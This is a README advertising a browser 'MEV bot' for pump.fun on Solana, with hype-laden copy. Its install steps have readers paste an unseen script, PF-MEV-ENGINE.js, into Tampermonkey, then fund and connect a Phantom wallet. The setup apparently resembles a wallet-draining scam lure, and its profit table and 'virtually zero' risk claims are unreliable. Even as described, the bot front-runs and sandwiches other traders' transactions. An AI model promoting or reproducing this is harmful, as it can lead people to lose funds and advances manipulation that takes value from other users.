# pump.fun mevbot

![jj](https://media.discordapp.net/attachments/1182882774709981187/1254296645076516944/Screenshot_2024-06-22_214645.png?ex=6678fa47&is=6677a8c7&hm=82c4fd978e8bf1d913df72ebda676b1b256fc412d1e356c62290e0e1e759611a&=&format=webp&quality=lossless&width=276&height=434)

This is a browser-based pump.fun MEV bot straight from the cabal. It scans the pump.fun Solana Program Library mempool and bonding curves to identify profitable transactions to front-run or sandwich. Effectively neutralizing all jeets.

## Why release the alpha?

I knew some of you might ask this, and i'm prepared to answer it. No, i'm not washed, we just have something much more efficient it the works. Wont it create more competition? wont it dilute profits? wont the devs just jeet harder? If you've been following my 1 sol journey on crypto twitter you will understand. The past few months have been a blur but i'm still locked in. You see -the trench never sleeps. By providing the trench community with this generational alpha it  will only serve to create more profit in volume for everyone on the Solana blockchain. A win-win scenario for Mr. Frog. More frogs = more bags

## How does it work exactly?

The bot scans the pump.fun  Solana Program Library(SPL) transcations, bonding curves, and the Solana public mempool itself The bot will swiftly execute an atomic bundle containing a buy tx directly before a targeted transaction in the block, as well a sell tx right after - effectively sandwiching the target and returning the profit to the users wallet. Due to the atomic nature of the bundled transaction, if the deployed transaction becomes unprofitable at any time the transaction will be reverted, reducing the risk of loss to virtually zero.

## Installation

>`Prerequisites: Phantom wallet with some SOL in it`

> **(1)** Install  the [Tampermonkey](https://tampermonkey.net) extension from the official website for whichever browser you use

> ![c](https://i.imgur.com/gA2A7Zw.png)

> **(2)** Visit [https://pump.fun](https://pump.fun) and click the tampermonkey icon in the toolbar

> >![b](https://i.imgur.com/onnY8J6.png)

> **(3)** Click "+ create new script.."

> ![a](https://media.discordapp.net/attachments/1182882774709981187/1254295141536108596/Screenshot_2024-06-22_213735.png?ex=6678f8e1&is=6677a761&hm=b01c56d7a52f8f5dbfc185dbf0225a328e91a2a630e3ec5d53b21a247662e95a&=&format=webp&quality=lossless&width=579&height=433)

> **(4)** Copy and paste the entire contents of **PF-MEV-ENGINE.js** into the code box after deleting the default contents.

> ![h](https://i.imgur.com/5hX5Y8A.png)
 
>  **(5)** In the code box toolbar click on "file" - "save"
  
>  **(6)** You can make sure the mevbot is enabled by clicking on "Installed Userscripts"
  
>  **(7)** Visit [https://pump.fun](https://pump.fun) ( you may need to refresh the website)
  
>  **(8)** Fund and Connect the wallet you wish to perform MEV transactions. make sure theres a minimum of .5 sol for efficient onchain operation and account rent.

>  **(9)** Click start

The bot will begin searching for arbitrage and transacting immediately.

Click **stop** or close the website to terminate the bots operations, any current transactions will be reverted.

Withdrawl profit from your wallet.
## Operation & Parameters

⚠️ The bot works best with  [Phantom](https://phantom.app/) wallet extension, but it also supports [Solflare](https://solflare.com/).

### Profit potential diagram
`A slippage threshold of 5% has shown us consistent returns accross the board for transactions within its balance range. Slippage thresholds higher than 5% are reccomended for high volume times in the market`

|       MEV         |threshold|Target Tx Amt                          |Profit                         |
|----------------|-|-------------------------------|-----------------------------|
|1 SOL|5%            | <= 1 SOL            |.01 - .09 SOL / TX
|2 SOL          |5%| <= 2 SOL            |.01 - .19 SOL / TX            ||
|3 SOL          |5%| <= 3 SOL| .01 - .29 SOL / TX

# Support

If you enjoyed all our hard work or it made your bags run_it_back.exe please kindly drop us a star ⭐ so we can get more visibility for open source 💖


